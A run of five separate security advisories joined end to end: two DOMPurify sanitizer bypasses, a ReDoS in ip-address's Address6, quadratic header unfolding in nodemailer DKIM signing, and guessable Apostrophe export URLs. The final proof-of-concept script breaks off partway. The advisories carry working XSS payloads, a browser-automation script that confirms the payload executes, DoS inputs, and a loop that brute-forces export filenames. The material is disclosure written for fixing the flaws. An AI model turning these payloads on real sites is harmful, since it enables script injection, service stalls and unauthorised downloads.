description:
### Summary

The 3.4.16 fix for GHSA-p98j-92pf-mc4p only covers a hook that removes the node it was called for. If an `IN_PLACE` hook removes a different node, like the current node's parent or a sibling that has not been visited yet, that subtree is never walked or neutralized. Event handlers in it stay on the elements, and an `<img onerror>` that was already loading fires after `sanitize()` returns.

The README says: "Nodes that a hook detaches from the tree ... are treated as removed. In IN_PLACE mode their subtree is neutralized inline, so an `<img onload>` that was already loading when you built the live tree cannot fire after `sanitize()` returns." That does not hold when the detached node is not the hook's own node.

### Tested versions

- 3.4.16 (latest) and main at 18f8f0e
- also 3.4.15, 3.4.12 and 2.5.8

jsdom for the matrix below, and Chromium (Playwright) for the event actually firing.

### Details

`src/purify.ts` line 2134 (`dist/purify.cjs.js` line 2009 in 3.4.16), `_handleHookDetachedNode()`:

```js
if (currentNode === root || getParentNode(currentNode) !== null) {
  return false;
}
if (IN_PLACE) {
  _neutralizeSubtree(currentNode);
}
```

It only checks whether `currentNode` lost its parent. When a hook removes `currentNode.parentNode` (or any ancestor), `currentNode` still has a parent, so nothing happens. The rest of the removed subtree is no longer reachable by the walker, and it is not in `DOMPurify.removed`, so the post walk pass does not see it either. The same happens when a hook removes a later sibling. This applies to all five element and attribute hooks.

### PoC (jsdom)

```js
const { JSDOM } = require('jsdom')
const createDOMPurify = require('dompurify')
const win = new JSDOM('<!doctype html><body></body>').window
const doc = win.document

for (const mode of ['self', 'parent', 'nextSibling']) {
  const DOMPurify = createDOMPurify(win)
  doc.body.innerHTML = '<div id=root><figure><img class=bad src=a.png>' +
    '<img id=evil src=x onerror=alert(1)></figure><p>ok</p></div>'
  const root = doc.getElementById('root')
  const evil = doc.getElementById('evil')

  // app hook: drop a bad image (self), its wrapper (parent), or the next element (nextSibling)
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    if (node.getAttribute && node.getAttribute('class') === 'bad') {
      if (mode === 'self') node.remove()
      if (mode === 'parent') node.parentNode.remove()
      if (mode === 'nextSibling') node.nextElementSibling.remove()
    }
  })

  DOMPurify.sanitize(root, { IN_PLACE: true })
  console.log(DOMPurify.version, mode.padEnd(11), 'onerror =', JSON.stringify(evil.getAttribute('onerror')))
}
```

Output on 3.4.16:

```
3.4.16 self        onerror = null
3.4.16 parent      onerror = "alert(1)"
3.4.16 nextSibling onerror = "alert(1)"
```

In `self` mode the walker still reaches the second image and strips `onerror`. In the other two modes the second image is detached with its handler still set. The same result is achieved with each of `beforeSanitizeElements`, `uponSanitizeElement`, `afterSanitizeElements`, `beforeSanitizeAttributes` and `afterSanitizeAttributes`.

### PoC (browser)

The same thing in a real page, served from 127.0.0.1 and opened in Chromium:

```html
<!doctype html><meta charset=utf-8>
<script src="purify.min.js"></script>
<body><pre id=log></pre>
<script>
window.fired = [];
function run(mode) {
  const D = DOMPurify(window);
  D.addHook('afterSanitizeAttributes', n => {
    if (n.getAttribute && n.getAttribute('class') === 'bad') {
      if (mode === 'parent') n.parentNode.remove();
      if (mode === 'self') n.remove();
    }
  });
  const root = document.createElement('div');
  document.body.appendChild(root);
  root.innerHTML = '<figure><img class=bad src=data:,><img src=x onerror="fired.push(\'' + mode + '\')"></figure><p>ok</p>';
  D.sanitize(root, { IN_PLACE: true });
  return root.outerHTML;
}
const a = run('self'), b = run('parent');
setTimeout(() => {
  document.getElementById('log').textContent =
    'version=' + DOMPurify.version + '\nself out=' + a + '\nparent out=' + b + '\nfired=' + JSON.stringify(fired);
}, 1500);
</script>
```

Result on 3.4.16:

```
version=3.4.16
self out=<div><figure><img src="x"></figure><p>ok</p></div>
parent out=<div><p>ok</p></div>
fired=["parent"]
```

The returned tree is clean in both cases, but the handler on the detached image runs in the page for `parent`.

### Impact

An app that uses `IN_PLACE` with a hook that removes a wrapper or a nearby element (for example "drop the whole `<figure>` if its image is not allowed") gets DOM XSS from attacker markup after `sanitize()` returns. It needs that kind of hook, so it falls under "input plus an application choice" in SECURITY.md, but it breaks the guarantee the README gives for hook detached nodes and is the same pattern as GHSA-55q2-fjhq-7xh7 and GHSA-p98j-92pf-mc4p.

### Suggested fix

Instead of only checking `currentNode`, check after each hook call whether anything outside the current node was detached. Two simple options:

- before calling a hook in `IN_PLACE` mode, remember the next node the walker will visit and the current node's ancestors; after the hook, neutralize any of them that are no longer attached under `root`
- or, after the walk, neutralize every element that was in the original tree but is no longer connected to `root` (for example by collecting the elements before the walk)

### Summary

DOMPurify drops `attributeName` attributes whose value contains `href`, so an allowed `<animate>` or `<set>` can't rewrite a link's href after sanitizing. The check compares the attribute name after `transformCaseFunc`, and that function doesn't lowercase in XHTML mode. In XHTML the attribute is spelled `attributeName`, so the comparison with `"attributename"` never matches and the guard does nothing.

An app that uses `PARSER_MEDIA_TYPE: 'application/xhtml+xml'` and allows `animate` and `attributeName` will keep `<animate attributeName="href" values="x;javascript:alert(1)">`. Clicking the parent link then runs the script.

This needs a non-default config, so going by SECURITY.md, this is a hardening bug rather than a bypass of the default config.

### Details

In `_sanitizeAttributes` (dist/purify.js line 2216 in 3.4.16):

```js
const lcName = transformCaseFunc(name);
...
if (lcName === "attributename" && stringMatch(value, "href")) {
  _removeAttribute(name, currentNode, attr);
  continue;
}
```

`transformCaseFunc` is `stringToLowerCase` for text/html but the identity function for application/xhtml+xml, because XML names are case-sensitive. The XML parser keeps SVG's real name `attributeName`, so in XHTML mode `lcName` is `attributeName` and the branch never runs.

People using XHTML mode have to list SVG attributes in camelCase. The built-in attribute lists are lowercase and won't match, so `ALLOWED_ATTR`/`ADD_ATTR: ['attributeName', ...]` is the config you'd naturally write here.

The value also passes the URI check. `IS_ALLOWED_URI` only checks the start of the string, and `x;javascript:alert(1)` looks like a relative value. SMIL reads `values` as a `;` list and, with `fill="freeze"`, the last entry ends up as the effective href of the parent `<a>`.

In text/html mode the same allowlist is handled correctly. The name is lowercased and `attributeName` is removed.

This is close to the XHTML case-sensitivity hardening in 3.4.14/3.4.15 (Attack Classes & Bypass History §22): a check written for lowercase names that a case-preserved name gets past.

### Proof of concept

Tested with DOMPurify 3.4.16 in Chrome 153 (headless shell). Also reproduced on 3.3.3, 3.3.1 and 3.2.7. Not confirmed for 2.x.

Config:

```js
const cfg = {
  PARSER_MEDIA_TYPE: 'application/xhtml+xml',
  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],
  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],
};
```

`{ PARSER_MEDIA_TYPE: 'application/xhtml+xml', USE_PROFILES: { svg: true }, ADD_TAGS: ['animate'], ADD_ATTR: ['attributeName'] }` behaves the same.

Input:

```html
<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60"><a id="q"><animate attributeName="href" values="x;javascript:alert(1)" dur="0.01s" fill="freeze"/><text x="10" y="40" font-size="30">click</text></a></svg>
```

Steps:

1. Save this as `poc.xhtml` next to `purify.js` (3.4.16) and open it in Chrome. The `.xhtml` extension makes Chrome load it as application/xhtml+xml, so nothing moves between HTML and XHTML.

```html
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>poc</title>
<script src="purify.js"></script></head><body><div id="sink"></div>
<script>//<![CDATA[
const cfg = {
  PARSER_MEDIA_TYPE: 'application/xhtml+xml',
  ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],
  ALLOWED_ATTR: ['attributeName', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],
};
const dirty = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60"><a id="q"><animate attributeName="href" values="x;javascript:alert(1)" dur="0.01s" fill="freeze"/><text x="10" y="40" font-size="30">click</text></a></svg>';
const clean = DOMPurify.sanitize(dirty, cfg);
console.log(clean);
document.getElementById('sink').innerHTML = clean;
//]]></script></body></html>
```

2. The logged output still contains `attributeName="href"` and `values="x;javascript:alert(1)"`.
3. `document.getElementById('q').href.animVal` returns `"javascript:alert(1)"`.
4. Click "click" and `alert(1)` runs.

As a control, remove `PARSER_MEDIA_TYPE` and change the allowlist entry to `attributename`. The output then loses `attributeName`, `href.animVal` is `""`, and clicking does nothing. The same XHTML-mode output also runs when inserted into a normal text/html page.

An automated version (fetches a given version from npm, clicks via CDP, checks for the dialog, runs the control) is below.

<details>
<summary>poc.sh</summary>

```bash
#!/usr/bin/env bash
# PoC: DOMPurify SMIL attributeName=href guard bypass in XHTML parser mode.
#
# Sanitizes an SVG payload with a PARSER_MEDIA_TYPE:"application/xhtml+xml"
# config that allow-lists <animate> + attributeName, renders the output into
# div.innerHTML in headless Chromium, clicks the link with a trusted (CDP) mouse
# event and reports whether alert() fired. Also runs the same allowlist in
# text/html mode as a control (DOMPurify strips attributeName there).
#
# usage:  ./poc.sh [dompurify-version]          (default 3.4.16, fetched via `npm pack`)
#         DOMPURIFY_JS=/path/to/purify.js ./poc.sh
#         CHROME=/path/to/chrome ./poc.sh
# needs:  node >= 18, npm (unless DOMPURIFY_JS is set), a Chromium/Chrome binary.
# exit:   0 = vulnerable (alert fired in xhtml mode), 1 = not vulnerable, 2 = setup error
set -euo pipefail
VER="${1:-3.4.16}"
WORK="$(mktemp -d)"
trap 'rm -rf "$WORK"' EXIT

if [ -z "${DOMPURIFY_JS:-}" ]; then
  (cd "$WORK" && npm pack "dompurify@$VER" --silent >/dev/null 2>&1 && tar xzf dompurify-*.tgz) || { echo "npm pack dompurify@$VER failed" >&2; exit 2; }
  DOMPURIFY_JS="$WORK/package/dist/purify.js"
fi
if [ -z "${CHROME:-}" ]; then
  for c in "$HOME"/.cache/ms-playwright/chromium_headless_shell-*/chrome-headless-shell-linux64/chrome-headless-shell \
           "$HOME"/.cache/ms-playwright/chromium-*/chrome-linux/chrome \
           "$(command -v google-chrome || true)" "$(command -v chromium || true)" "$(command -v chromium-browser || true)"; do
    [ -n "$c" ] && [ -x "$c" ] && CHROME="$c" && break
  done
fi
[ -n "${CHROME:-}" ] || { echo "no Chrome/Chromium found; set CHROME=" >&2; exit 2; }

cat > "$WORK/poc.html" <<'EOF'
<!doctype html><meta charset="utf-8"><title>poc</title>
<script src="purify.js"></script>
<div id="sink"></div>
<script>//<![CDATA[
const payload = '<svg xmlns="http://www.w3.org/2000/svg" width="200" height="60">' +
  '<a id="q"><animate attributeName="href" values="x;javascript:alert(1)" dur="0.01s" fill="freeze"/>' +
  '<text x="10" y="40" font-size="30">click</text></a></svg>';
function run(mode) {
  const cfg = {
    ALLOWED_TAGS: ['svg', 'a', 'animate', 'text'],
    ALLOWED_ATTR: [mode === 'xhtml' ? 'attributeName' : 'attributename', 'values', 'dur', 'fill', 'x', 'y', 'font-size', 'id', 'width', 'height'],
  };
  if (mode === 'xhtml') cfg.PARSER_MEDIA_TYPE = 'application/xhtml+xml';
  const clean = DOMPurify.sanitize(payload, cfg);
  document.getElementById('sink').innerHTML = clean;
  return clean;
}
//]]></script>
EOF
cp "$DOMPURIFY_JS" "$WORK/purify.js"
# Same test inside a real XHTML document (no HTML<->XHTML context flip):
# the page is parsed as application/xhtml+xml and the sink's innerHTML uses the XML fragment parser.
sed -e 's#<!doctype html><meta charset="utf-8"><title>poc</title>#<html xmlns="http://www.w3.org/1999/xhtml"><head><title>poc</title>#' \
    -e 's#<script src="purify.js"></script>#<script src="purify.js"></script></head><body>#' \
    -e 's#^</script>$#</script></body></html>#' "$WORK/poc.html" > "$WORK/poc.xhtml"

cat > "$WORK/drive.js" <<'EOF'
// zero-dependency CDP driver over --remote-debugging-pipe
const { spawn } = require('child_process');
const [chrome, url, dir] = process.argv.slice(2);
const xurl = url.replace(/\.html$/, '.xhtml');
const p = spawn(chrome, ['--headless', '--no-sandbox', '--remote-debugging-pipe', '--disable-gpu', '--no-first-run',
  `--user-data-dir=${dir}/profile`, 'about:blank'], { stdio: ['ignore', 'ignore', 'ignore', 'pipe', 'pipe'] });
let id = 0, buf = ''; const pend = new Map(), dialogs = [];
p.stdio[4].on('data', (d) => {
  buf += d; let i;
  while ((i = buf.indexOf('\0')) >= 0) {
    const m = JSON.parse(buf.slice(0, i)); buf = buf.slice(i + 1);
    if (m.id && pend.has(m.id)) { pend.get(m.id)(m); pend.delete(m.id); }
    else if (m.method === 'Page.javascriptDialogOpening') {
      dialogs.push(m.params.message);
      send('Page.handleJavaScriptDialog', { accept: true }, m.sessionId);
    }
  }
});
function send(method, params = {}, sessionId) {
  return new Promise((r) => { const n = ++id; pend.set(n, r); p.stdio[3].write(JSON.stringify({ id: n, method, params, sessionId }) + '\0'); });
}
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
(async () => {
  const { result: { targetId } } = await send('Target.createTarget', { url: 'about:blank' });
  const { result: { sessionId: s } } = await send('Target.attachToTarget', { targetId, flatten: true });
  await send('Page.enable', {}, s); await send('Runtime.enable', {}, s);
  const ev = async (e) => (await send('Runtime.evaluate', { expression: e, returnByValue: true, awaitPromise: true }, s)).result.result.value;
  let vulnerable = false, xhtmlDoc = false;
  const ver = async () => ev('DOMPurify.version');
  for (const [mode, page] of [['html', url], ['xhtml', url], ['xhtml', xurl]]) {
    await send('Page.navigate', { url: page }, s); await sleep(500);
    const docType = await ev('document.contentType');
    if (mode === 'html') console.log('DOMPurify', await ver(), '/', await ev('navigator.userAgent.match(/Chrome\\/[\\d.]+/)[0]'));
    dialogs.length = 0;
    const clean = await ev(`run(${JSON.stringify(mode)})`);
    await sleep(400); // let the 0.01s animation apply (fill=freeze)
    const href = await ev(`(()=>{const a=document.getElementById('q');return a?a.href.animVal:null})()`);
    const box = await ev(`(()=>{const t=document.querySelector('#sink text');if(!t)return null;const r=t.getBoundingClientRect();return [r.x+r.width/2,r.y+r.height/2]})()`);
    if (box) for (const type of ['mouseMoved', 'mousePressed', 'mouseReleased'])
      await send('Input.dispatchMouseEvent', { type, x: box[0], y: box[1], button: 'left', clickCount: 1 }, s);
    await sleep(800);
    console.log(`\n[${mode} mode, sink document ${docType}] sanitized output:\n  ${clean}`);
    console.log(`  animated <a> href (animVal): ${JSON.stringify(href)}`);
    console.log(`  alert() fired on click: ${dialogs.length ? 'YES ' + JSON.stringify(dialogs) : 'no'}`);
    if (mode === 'xhtml' && dialogs.length) vulnerable = true;
    if (mode === 'xhtml' && docType === 'application/xhtml+xml') xhtmlDoc = dialogs.length > 0;
  }
  console.log(vulnerable ? `\nRESULT: VULNERABLE (javascript: executed in XHTML mode; pure-XHTML document sink: ${xhtmlDoc ? 'also executes' : 'no'})` : '\nRESULT: not vulnerable');
  p.kill('SIGKILL'); process.exit(vulnerable ? 0 : 1);
})().catch((e) => { console.error(e); p.kill('SIGKILL'); process.exit(2); });
EOF
node "$WORK/drive.js" "$CHROME" "file://$WORK/poc.html" "$WORK"
```

</details>

### Impact

Stored or reflected XSS on a click. It affects apps that sanitize SVG in XHTML mode and allow `animate` (or `set`) with `attributeName`, for example to keep simple SVG animations. Script runs in the app's origin when a user clicks the sanitized link. Default configs and text/html mode aren't affected.

### Summary

`new Address6()` and `Address6.isValid()` strip a zone identifier with the pattern `/%.*$/` before they apply the 45-character length limit. When the string holds many `%` characters followed by a line terminator, the pattern is retried from every `%` and each attempt scans to the line terminator before failing, so rejecting the string takes time proportional to the square of its length. 10,000 `%` characters and a newline take 41 ms, 40,000 take 632 ms and 100,000 take 3.9 s of synchronous work. The same strings without the newline are rejected in under a millisecond.

An application that validates an attacker-supplied string with these methods can be stalled by a single long request. The input is rejected with the correct `AddressError`; the cost of reaching that rejection is the defect.

### Details

The constructor in `src/ipv6.ts` removes the CIDR suffix, then the zone, then checks the length of what is left:

```ts
const zone = constants6.RE_ZONE_STRING.exec(address);

if (zone) {
  this.zone = zone[0];

  address = address.replace(constants6.RE_ZONE_STRING, '');
}

const longest = this.groups * 5 + 5;

if (address.length > longest) {
  throw new AddressError(`IPv6 addresses are at most ${longest} characters.`);
}
```

`RE_ZONE_STRING` is `/%.*$/`. It has no anchor at its start, `.` does not match a line terminator (`\n`, `\r`, U+2028 or U+2029), and without the `m` flag `$` matches only at the end of the input. For `%` repeated N times and then `\n`, the engine starts a match at the first `%`, `.*` consumes the remaining `%` characters up to the newline, `$` fails there, and backtracking through every shorter `.*` fails too. The engine then starts again at the second `%`, and so on: N starts, each proportional to N. The length limit that follows rejects the string in constant time, after the scan has already run.

The line terminator need not be last. Any string in which many `%` characters precede a line terminator behaves the same way.

Every entry point that passes a caller's string to the `Address6` constructor is affected: `new Address6()`, `isValid()`, both arguments of `fromAddressAndMask()` and `fromAddressAndWildcardMask()`, and the prefix argument of `fromAddress4Nat64()` and `toAddress4Nat64()`. `fromWildcard()` rejects a `%` before it constructs anything, `fromURL()` admits only hex digits, colons and dots in a host, and `fromArpa()` checks the nibble grammar first, so those three are unaffected. `Address4` has no zone and is unaffected.

### Affected versions

`<= 10.7.3`. The zone pattern has been in the constructor since 1.0.0; 5.9.4, 9.0.5 and 10.7.0 show the same timings as 10.7.3.

### Impact

`Address6.isValid()` on N `%` characters and a newline, measured on ip-address 10.7.3 and node 24.21.0:

| Input | Wall time | Same length of `!` |
|---|---|---|
| 5,461 characters | 13 ms | 0.1 ms |
| 16 KiB | 108 ms | 0.1 ms |
| 100 KB | 3.9 s | 0.1 ms |
| 256 KiB | 27 s | 0.2 ms |

The parse is synchronous, so the event loop is blocked for the whole of the wall time and nothing else on that process is served. No memory is retained and the process resumes when the call returns.

### Reachability

The input needs a line terminator after the `%` characters, which decides where it can arrive. An HTTP header value cannot carry a carriage return or a line feed, so a host or address taken from a header does not reach this. A URL can carry both characters percent-encoded at three bytes each, and Node's default 16 KB limit on the request line and headers admits about 5,461 of them: 13 ms. A request body is where the larger sizes come from. Common body parsers default to between 100 KB and 1 MB, and at 100 KB one field passed to the parser unchecked blocks the process for 3.9 s.

### Proof of concept

`npm i ip-address@10.7.3`, then:

```js
const { Address6 } = require('ip-address');

function time(input) {
  const start = process.hrtime.bigint();

  Address6.isValid(input);

  return `${(Number(process.hrtime.bigint() - start) / 1e6).toFixed(1)} ms`;
}

for (const n of [10000, 20000, 40000, 100000]) {
  console.log(`${n}: ${time(`${'%'.repeat(n)}\n`)}, without the newline ${time('%'.repeat(n))}`);
}
```

On affected versions (node 24.21.0):

```
10000: 41.0 ms, without the newline 0.0 ms
20000: 161.1 ms, without the newline 0.0 ms
40000: 632.4 ms, without the newline 0.1 ms
100000: 3899.8 ms, without the newline 0.1 ms
```

Each doubling of the input multiplies the time by four.

### Remediation

Upgrade to the patched release. In the fix, the constructor finds the zone by the index of the first `%` and accepts the remainder as a zone only when it holds no line terminator, which reads the input once. 1 MiB of the input above is rejected in about a millisecond. Every address that parsed before parses to the same result, and a string with a line terminator after a `%` is rejected as it was.

`RE_ZONE_STRING` stays exported from `v6/constants` for code that imports it directly and is marked `@deprecated`; the library itself does not call it.

If you cannot upgrade immediately, reject a candidate longer than an address with a zone identifier can be before you parse it:

```js
if (host.length > 64) throw new Error('not an IP address');
```

## Summary

When nodemailer DKIM-signs an outbound message, its DKIM message parser unfolds RFC 5322 header continuation lines with a loop that concatenates each continuation line onto the preceding line and then re-tests the anchored regex `/^[ \t]/` against the growing merged line on every iteration. Re-testing the regex against the ever-growing accumulated line forces a full string flatten proportional to the accumulated length on each iteration, yielding O(n^2) CPU in the number of continuation lines. An application user who influences the size of a header that folds into many continuation lines (most naturally a large recipient list, but also a long custom header, Subject, or References) can drive tens of thousands of continuation lines and block the single-threaded Node.js event loop for seconds during signing, a repeatable denial of service.

## Root Cause

The invariant that signing a message performs work linear in the message size is violated in the header-unfolding step. In `src/dkim/message-parser.ts`, `parseHeaders()` splits the buffered header block into `lines` and iterates backward; for each line matching the continuation pattern `/^[ \t]/`, it does `lines[i - 1] += '\n' + lines[i]` and `lines.splice(i, 1)`. The dominant cost is not the array splice: iterating backward keeps each splice near the shrinking tail, so it shifts only the few trailing header lines. The quadratic cost is the anchored regex test `/^[ \t]/.test(lines[i])` (together with the `+=` concatenation) evaluated against the growing merged line on every iteration. The `+=` builds an O(1) rope, but the next iteration's regex test forces a full flatten of the entire accumulated line, so the total cost is the sum over all continuation lines, which is O(n^2). The header block is buffered by `checkHeaders` without any size or line-count cap; the DKIM signer's `MAX_MESSAGE_SIZE` and `cacheTreshold` knobs gate the body stream only, not the header block, so nothing bounds the number of continuation lines fed to the loop.

```text
Affected file and function (verified at the published v10.0.9 artifact, in src/ and compiled verbatim into the published dist output):
- src/dkim/message-parser.ts: MessageParser.parseHeaders (the continuation-unfold loop that re-tests /^[ \t]/ against the growing merged line)
```

## Impact

An attacker or user who can make an outbound, DKIM-signed message carry a header that folds into a large number of continuation lines can freeze the sending Node.js process during signing. Because Node.js is single-threaded, the synchronous unfold loop starves the entire event loop, halting all other work in the process, and it is repeatable on every such message. The natural lever is a large recipient list: nodemailer's own MIME composer folds a To or Cc value at column 76 into space-prefixed continuation lines, and the count scales linearly with the number of recipients, so a caller-supplied recipient list (common in bulk-mail, notification, and multi-tenant email APIs) turns into tens of thousands of continuation lines. The single precondition is that DKIM signing is enabled, which is a mainstream deliverability configuration. Independent reproduction on Node.js 24 measured roughly 2.8 seconds of event-loop blocking at about 20,000 continuation lines and roughly 11.5 seconds at about 40,000, scaling quadratically; the full composer-to-signer chain with a 60,000-recipient To header blocked for roughly 6.6 seconds. The applications that cap recipient count or header size shrink the exposed population but do not change the per-message availability impact once a large header is accepted.

## Proof of Concept

`Node.js 24; the shipped DKIM signer (require('nodemailer/lib/dkim')) or the exact unfold loop.`

Steps: (1) construct a message whose header block contains one header value folded into many space-prefixed continuation lines (for example by supplying a very large recipient list, which nodemailer's MIME composer folds automatically); (2) DKIM-sign it and observe the event loop stall while `parseHeaders` unfolds the block. A minimal microbenchmark of the exact unfold logic demonstrates the complexity:

```js
// Reproduces the parseHeaders unfold loop verbatim (Node 24).
function unfold(headerBlock) {
    const lines = headerBlock.split(/\r?\n/);
    for (let i = lines.length - 1; i > 0; i--) {
        if (/^[ \t]/.test(lines[i])) {
            lines[i - 1] += '\n' + lines[i];
            lines.splice(i, 1);
        }
    }
    return lines;
}
function run(n) {
    let block = 'To: a@b.c\r\n';
    for (let i = 0; i < n; i++) block += ' cont-' + i + '@example.com,\r\n';
    for (let k = 0; k < 5; k++) block += 'X-H' + k + ': v\r\n';
    const t = Date.now();
    unfold(block);
    return Date.now() - t;
}
for (const n of [5000, 10000, 20000, 40000]) console.log(n, run(n) + 'ms');
```

```text
5000   27ms
10000  542ms
20000  2853ms
40000  11503ms
(2x input yields roughly 4x-5x time: quadratic. The cost is the regex re-flatten of the growing merged line, not the splice.)
```

## Attack Chain

1. **Exposure:** An application DKIM-signs outbound mail (a mainstream deliverability configuration, enabled per transport or per message) for a message whose header size is influenced by a user, for example a large recipient list, a long custom header, Subject, or References.
2. **Control:** The attacker or user controls the size of that header. The MIME composer folds it deterministically at column 76 into space-prefixed continuation lines that match the continuation pattern, so the continuation-line count scales linearly with the supplied size.
3. **Path:** Signing pipes the composed message through the DKIM MessageParser; `checkHeaders` buffers the whole header block into `rawHeaders` and calls `parseHeaders()`, the single sink, on every signed message.
4. **Guard:** No header-size or line-count cap exists between the input and the sink; the signer's body-only size thresholds do not apply to the header block.
5. **Primitive:** The unfold loop re-tests the anchored regex against the growing merged line on each continuation line, forcing a full flatten per iteration and yielding O(n^2) synchronous CPU.
6. **Result:** Event-loop starvation of the single-threaded sending process for an attacker-scaled duration, repeatable per message: a denial of service.

## Bypass Evidence

The relevant guard would be a cap on header-block size or continuation-line count before unfolding. A search of the DKIM module confirms none exists: `checkHeaders` accumulates header chunks unbounded until the header terminator, and the only size knobs (`MAX_MESSAGE_SIZE`, `cacheTreshold`) are checked against the body stream, not the header block. The strongest disproof attempt was that the backward `splice` makes the loop cheap for a single consecutive folded block (so it would not be quadratic); this was refuted by a mechanism-isolation benchmark: removing the splice entirely leaves the loop just as slow (about 11 seconds at 40,000 lines), while precomputing the continuation test on the original lines so the growing merged line is never re-tested collapses it to a few milliseconds. This proves the quadratic driver is the regex re-flatten of the accumulated line, not the array shift, and confirms the loop is quadratic even for a single consecutive folded block. No published advisory covers this file: the disclosed complexity issues all live in the address parser and recipient-normalization code, and the DKIM message parser has never received a complexity fix.

## Affected Versions

- `Ecosystem: npm`
- `Package: nodemailer`
- `Confirmed affected range: <= 10.0.9`
- `Latest release checked: nodemailer 10.0.9 (npm registry; vulnerable code verified at git tag v10.0.9 and in the published dist output)`
- `Fix status: not fixed (no released version removes the quadratic unfold or caps header size)`

The unfold loop is long-standing DKIM code that predates the address-parser complexity fix family, so the exact introducing release is not positively established and the lower bound is left open; the upper bound is verified against the current published artifact, which is vulnerable with no fix.

## Suggested Fix

Enforce linear-time header unfolding and bound the header block. The key correction is to stop re-scanning the growing accumulated line: classify each line's continuation status on the original split lines before merging, and build the unfolded value with an array plus a single join rather than repeatedly re-testing and concatenating the growing string. Simply replacing `splice` with a filter or two-pointer compaction while still re-testing the merged line would not fix the issue, because the regex re-flatten of the accumulated line is the quadratic driver. Independently, impose a configurable maximum on the buffered header-block size or continuation-line count in the message parser and fail closed when it is exceeded, so an oversized folded header cannot force unbounded work. As an interim mitigation, applications should cap recipient counts and header-value sizes for messages that will be DKIM-signed.

Reported by zx (GitHub: @manus-pi).

## Summary

When a user exports content through `@apostrophecms/import-export`, the module copies the generated archive into uploadfs at `/exports/` and returns a public URL under `/uploads/exports/`. The filename is fully deterministic: site `shortName`, document type, a `YYYYMMDDHHmmss` timestamp, and the format extension. There is no secret token.

Anyone who can guess that path can download the archive with a normal unauthenticated HTTP GET while the file is still present (10 minutes by default, longer if the site raises `importExport.export.expiration`). That is a different model from attachment URLs, which rely on hard-to-guess IDs.

Sites that disable export, store uploads on a private backend with no anonymous read, or serve `/uploads` only behind authentication are not hit by the network download step—but the predictable naming is still a design flaw for the default local/public uploadfs layout.

Import-only workflows and imports themselves are out of scope; this is specific to the export download URL.

## Affected configurations

All of the following must apply:

1. The `@apostrophecms/import-export` module is enabled and export is allowed for at least one page or piece type, **and**
2. Export files are served the usual way: `copyIn` to `/exports/…` and delivery via the public `uploads` URL (default local uploadfs or any deployment that exposes the same path without per-file auth).

If export is turned off per type or globally, or `/uploads` is not world-readable, an anonymous attacker cannot pull the file over HTTP—but a co-resident attacker with filesystem or bucket listing access would still see guessable names.

## Remediation

- Put a high-entropy component in the export filename (e.g. `apos.util.generateId()`), **or**
- Stop publishing exports on a world-readable URL—serve downloads through an authenticated route and keep objects in a private prefix until then, **or**
- Document that `importExport.export.expiration` must stay short and treat `/uploads/exports/` as sensitive (weak on its own).

### Details

## Technical details

`exportFile()` in `packages/import-export/lib/methods/export.js` builds the name and publishes it:

```javascript
const date = dayjs().format('YYYYMMDDHHmmss');
const filename = `${self.apos.shortName}-${req.body.type.toLowerCase()}-export-${date}${format.extension}`;
const downloadPath = path.join('/exports', filename);
await copyIn(filepath, downloadPath);
```

The admin UI sends `type` as the module name (e.g. `article`), which matches the filename. The download URL is only shown in the exporter’s notification; nothing binds the HTTP request to that user afterward. After `expiration` (default `1000 * 60 * 10` ms) a timer deletes the object from uploadfs, which limits exposure but leaves a brute-forceable window.


## Proof of concept

The script boots a minimal Apostrophe app with import-export, performs an export as the task user, then downloads the same archive without a session—first by path guessing, then with raw `fetch`. It exits non-zero on failure.

**Requirements:** Node 18+, `pnpm install` at the monorepo root (so `apostrophe` and `@apostrophecms/import-export` resolve). Set `APOSTROPHE_ROOT` to the checkout path.

```bash
#!/usr/bin/env bash
set -euo pipefail

# --- config ---
APOSTROPHE_ROOT="${APOSTROPHE_ROOT:-}"
if [[ -z "${APOSTROPHE_ROOT}" || ! -f "${APOSTROPHE_ROOT}/packages/import-export/package.json" ]]; then
  echo "Set APOSTROPHE_ROOT to your apostrophe monorepo checkout." >&2
  exit 1
fi

export APOS_TEST_DB_PROTOCOL=sqlite
cd "${APOSTROPHE_ROOT}/packages/import-export"

# --- run embedded PoC (no extra repo files) ---
node <<'NODE'
const assert = require('node:assert/strict');
const path = require('node:path');
const dayjs = require('dayjs');
const t = require('apostrophe/test-lib/util.js');

(async () => {
  let apos;
  const shortName = 'poc-export-site';
  const exportsPath = (root) => path.join(root, 'public/uploads/exports');

  try {
    apos = await t.create({
      root: module,
      testModule: true,
      shortName,
      modules: {
        '@apostrophecms/express': {
          options: { session: { secret: 'poc-export-secret' } }
        },
        '@apostrophecms/import-export': {
          options: {
            importExport: { export: { expiration: 60 * 1000 } }
          }
        },
        '@apostrophecms/uploadfs': { options: { storage: 'local' } },
        'home-page': { extend: '@apostrophecms/page-type' },
        article: {
          extend: '@apostrophecms/piece-type',
          options: { alias: 'article', autopublish: true }
        }
      }
    });

    const importExport = apos.modules['@apostrophecms/import-export'];
    const req = apos.task.getReq();
    await apos.article.insert(req, {
      ...apos.article.newInstance(),
      title: 'GHSA PoC confidential piece'
    });

    const articles = await apos.article.find(req).toArray();
    assert.ok(articles.length > 0);

    const exportStartedAt = dayjs();
    req.body = {
      _ids: articles.map((d) => d._id),
      formatName: 'gzip',
      type: 'article'
    };

    const { url: downloadUrl } = await importExport.export(req, apos.article);
    const fileName = path.basename(downloadUrl);
    const prefix = `${shortName}-article-export-`;
    assert.ok(fileName.startsWith(prefix) && fileName.endsWith('.tar.gz'));

    const timestamp = fileName.slice(prefix.length, -'.tar.gz'.length);
    const onDisk = path.join(exportsPath(apos.rootDir), fileName);
    assert.ok(require('node:fs').existsSync(onDisk));

    const anon = await apos.http.get(downloadUrl, { fullResponse: true });
    assert.equal(anon.status, 200);
    assert.ok(Number(anon.headers['content-length'] || 0) > 0 || anon.body?.length > 0);

    let bruteForced = null;
    const center = exportStartedAt.startOf('second');
    for (let offset = -3; offset <= 3; offset++) {
      const ts = center.add(offset, 'second').format('YYYYMMDDHHmmss');
      const candidate = `/uploads/exports/${shortName}-article-export-${ts}.tar.gz`;
